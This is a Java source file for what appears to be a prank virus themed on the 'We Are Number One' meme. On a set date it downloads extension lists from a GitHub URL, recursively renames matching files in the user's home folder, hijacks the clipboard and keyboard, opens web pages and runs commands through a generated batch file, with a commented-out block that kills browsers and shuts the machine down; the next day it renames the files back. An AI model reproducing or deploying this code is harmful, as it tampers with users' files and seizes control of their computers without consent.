package weAre;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.awt.event.KeyEvent;
import java.io.File;
import java.io.IOException;
//import java.lang.reflect.InvocationTargetException;
import java.text.SimpleDateFormat;
//import java.util.Arrays;
import java.util.Date;
import java.util.Random;

public class NumberOne {
	public static final String memezz = "https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/meme";
	public static final String extttt = "https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/ext";
	public static final String user = System.getProperty("user.name");
	public static final String dir = System.getProperty("user.dir");
	public static String[] meme = new String[0];
	public static String[] ext = new String[0];
	public static boolean[] pay = {false, false};
	public static boolean running = true;
	public static Random r = new Random();
	public static String[] date = {
			//"03",
			"11"			
	}; //dd
	public static void main(String[] args) throws IOException{
		System.out.println("Startupiing");
		startup();
		System.out.println("ARGS " + args.length);
		final boolean d = cDate();
		final boolean d1= cDate1();
		if(args.length>0) {
			switch(args[0]){
				case("a"): {tree("C:\\Users\\" + user, false); return;}
				case("b"): {tree("C:\\Users\\" + user, true); return;}
				case("c"): {
						new Thread(new RandomSound()).start();
						return;
					}
				case("d"): {
					//new Thread(new Video()).start();
					return;
				}
				case("e"): {wait(Integer.parseInt(args[1]), Boolean.parseBoolean(args[2])); return;}
				case("f"): {new Thread(new Last()).start(); return;}
				case("g"): {new Thread(new Printer()).start(); return;}
				case("h"): {
					for(String s : args){
						try{
							if(!Last.select(Integer.parseInt(s))) System.out.println("Invalid payload.");
						}catch(Exception e) {};
					}
					return;
				}
				default: {System.out.println("Invalid option"); return;}
			}
			//System.out.println("Treeing");
		}
		boolean b = true;
		boolean b1= true;
		boolean b2= true;
		while(running){
			if(d){
				if(b){
					System.out.println("PAYLOADS ACTIVATED");
					FileO.newFile("NumberOne.txt");
					FileO.writer("HAPPY WE ARE NUMBER ONE DAY!", "NumberOne.txt");
					FileO.addWrite("NumberOne.txt", "Today I will help you to celebrating this day :D");
					FileO.addWrite("NumberOne.txt", "First: DON'T let your sport/fruit and vegetables thing steal your mind: " +
						"I will help you prevent you using this computer ;D");
					FileO.addWrite("NumberOne.txt", "Second: read the first");
					FileO.addWrite("NumberOne.txt", "Don't worry: ur computer tomorrow will return the same as always");
					exe("start NumberOne.txt");
					wait(1000, false);
					exe("start https://www.gofundme.com/2tm9tqk");
					new AePlayWave("20.wav").start();
					b = false;
					tree("C:\\Users\\" + user, true);
					wait(r.nextInt(15000) + 15000, true);
					//exe("REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"http://nowlookatthis.net/\" /F");
					exe("homepage.bat");
					new Thread(new Last()).start();
					//"C:\\Users\\" + user + "\\"
				}
				if(r.nextInt(5) > 2 && pay[0]){
					int i = r.nextInt(2);
					System.out.println("MAIN: Clipboard: copying " + i);
					switch(i){
						case 0: {clipBoard("We are number one!"); break;}
						case 1: {clipBoard("Robbie Rotten"); break;}
						default:{clipBoard("I<3 Stefan Karl Stefansson!"); break;}
					}
				} else System.out.println("MAIN: Clipboard: Skipping turn");
				if(r.nextInt(5) > 2 && pay[1]){
					System.out.println("MAIN: Type: Typing...");
					try {
						type();
					} catch (AWTException e) {
						e.printStackTrace();
					}
				} else System.out.println("MAIN: Type: Skipping turn");
				if(time("HHmm").equals("2200")){
					if(b1){
						exe("start https://www.facebook.com/WeAreNumberOneLiveEvent/videos/551909668347068/");
						b1 = false;
					}
				} else b1 = true;
				if(time("HHmm").equals("2216")){ //4 3 1 6
					if(b2){
						exe("start https://youtu.be/yUUB9DhCLJ0");
						b2 = false;
					}
				} else b2 = true;
				/*if(time("HHmm").equals("2359")){ //4 3 1 6
					if(b1){
						running = false;
						FileO.delater("done.tmp");
						exe("takkill /IM c.exe /F");
						exe("takkill /IM s.exe /F");
						exe("takkill /IM firefox.exe /F");
						exe("takkill /IM chrome.exe /F");
						exe("takkill /IM iexplorer.exe /F");
						exe("takkill /IM MicrosoftEdge.exe /F");
						wait(10000, true);
						exe("final.vbs");
						while(!FileO.exist("done.tmp")) wait(1000, false);
						wait(2500, true);
						Last.last();
						exe("shutdown -p");
						stop();
						b1 = false;
					}
				} else b1 = true;*/
			}
			if(d1){
				if(b){
					FileO.newFile("NumberOne.txt");
					FileO.writer("You ejoyed the we are number one day?", "NumberOne.txt");
					FileO.addWrite("NumberOne.txt", "Now i'm (trying) to backing your computer as normal.");
					FileO.addWrite("NumberOne.txt", "Hope you will have a good day! Now, i'm going to an english course, so... See you next time! :D");
					FileO.addWrite("NumberOne.txt", "(Remember, go support our Stefan: https://www.gofundme.com/2tm9tqk)"); 
					exe("start NumberOne.txt");
					new AePlayWave("18.wav").start();
					wait(1000, false);
					exe("start https://www.gofundme.com/2tm9tqk");
					b = false;
					tree("C:\\Users\\" + user, false);
					stop();
				}
			}
			int i = r.nextInt(10000);
			System.out.println("MAIN: " + i);
			wait(i, false);
		}
	}
	public static void stop(){
		while(true) wait(Integer.MAX_VALUE, false);
	}
	public static void clipBoard(String text){
		StringSelection stringSelection = new StringSelection(text);
		Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
		clipboard.setContents(stringSelection, stringSelection);
	}
	public static void startup() throws IOException{
		System.out.println("Startupping");
		do{
			try{
				String[] localExt = Download.dwn(extttt).split("@");
				String[] localMeme = Download.dwn(memezz).split("@");
				meme = localMeme;
				ext = localExt;
			}catch(Exception e){
				wait(1000, true);
				e.printStackTrace();
			}
		}while(meme.length==0||ext.length==00);
		if(!FileO.exist("command")) FileO.newFile("command");
		if(!FileO.exist("other.bat")) FileO.newFile("other.bat");
		FileO.writer("@echo off", "other.bat");
		FileO.addWrite("other.bat", "for /f \"delims=\" %%x in (command) do set Build=%%x");
		FileO.addWrite("other.bat", "%Build%");
		FileO.addWrite("other.bat", "exit");
	}
    public static String time(String format) {
        SimpleDateFormat sdfDate = new SimpleDateFormat(format);
        Date now = new Date();
        String strDate = sdfDate.format(now);
        return strDate;
    }
    public static boolean cDate(){
    	for(int i = 0; i < date.length; i++) if(time("dd").equals(date[i])) return true;
    	return false;
    }
    public static boolean cDate1(){
    	for(int i=0;i<date.length;i++)if(Integer.parseInt(time("dd"))==Integer.parseInt(date[i])+1)return true;
    	return false;
    }
    public static void exe(String cmd) throws IOException{
    	FileO.writer(cmd, "command");
    	Runtime.getRuntime().exec("other.bat");
    }
    public static void wait(int time, boolean mode){
    	if(!mode) time = r.nextInt(time);
    	try{
		    Thread.sleep(time);
		} catch(InterruptedException ex){
			ex.printStackTrace();
		    Thread.currentThread().interrupt();
		}
    }
    public static void type() throws AWTException {
    	Robot robot = new Robot();
    	int[] key = {
    			KeyEvent.VK_R, KeyEvent.VK_O, KeyEvent.VK_B, KeyEvent.VK_B, KeyEvent.VK_I, KeyEvent.VK_E,
    			KeyEvent.VK_SPACE,
    			KeyEvent.VK_R, KeyEvent.VK_O, KeyEvent.VK_T, KeyEvent.VK_T, KeyEvent.VK_E, KeyEvent.VK_N
    	};
    	for(int i = 0; i < key.length; i++){
    		robot.keyPress(key[i]);
    		robot.delay(50);
    		robot.keyRelease(key[i]);
    		robot.delay(50);
    	}
    }
	public static void tree(String dir, boolean mode){
		try{
			File[] listOfFiles = new File(dir).listFiles();
			for(int i = 0; i < listOfFiles.length; i++){
				if(listOfFiles[i].isFile()){
					String s = listOfFiles[i].getName();
					String nExt = "robbierotten";
					System.out.print(s + " ");
					if(mode){
						if(extVerify(s)) {System.out.print(" replace ");FileO.rename(dir + "\\" + s, dir + "\\" + s + "." + nExt);}
					} else {
						if(checkLast(s, nExt)) {System.out.print(" replace ");replacer(dir + "\\" + s);}
					}
					//System.out.println(dir + s + nExt);
					//System.out.println(dir + "\\" + s.substring(0, nExt.length()));
					System.out.println("done");
				} else if(listOfFiles[i].isDirectory()){
					System.out.println("exploring " + listOfFiles[i].getName());
					tree(dir + "\\" + listOfFiles[i].getName(), mode);
					System.out.println("DONE");
				}
			}
		}catch(NullPointerException e) {e.printStackTrace();}
	}
	public static void replacer(String s){
		String[] sp = s.split("\\.");	
		String r = "";
		for(int i = 0; i < (sp.length - 1); i++) r += sp[i] + ".";
		System.out.println("\n" + s + " " + r);
		FileO.rename(s, r);
	}
	public static boolean extVerify(String s){
		for(int i = 0; i < ext.length; i++) {
			//System.out.println("TEST");
			//System.out.print("("+ext[i]+")");
			if(checkLast(s, ext[i])) return true;
			//System.out.println(b);
		}
		return false;
	}
	public static boolean checkLast(String s, String comp){
		String[] sp = s.split("\\.");
		//System.out.println(Arrays.toString(sp));
		if(sp.length==0) return false;
		try{
			if(sp[sp.length - 1].equals(comp)) return true;
		}catch(ArrayIndexOutOfBoundsException e) {}
		return false;
		/*try{
			return s.substring(s.length() - comp.length()).equalsIgnoreCase(comp);
		}catch(java.lang.StringIndexOutOfBoundsException e){
			e.printStackTrace();
		}
		System.out.println(1);
		return false;*/
	}
}
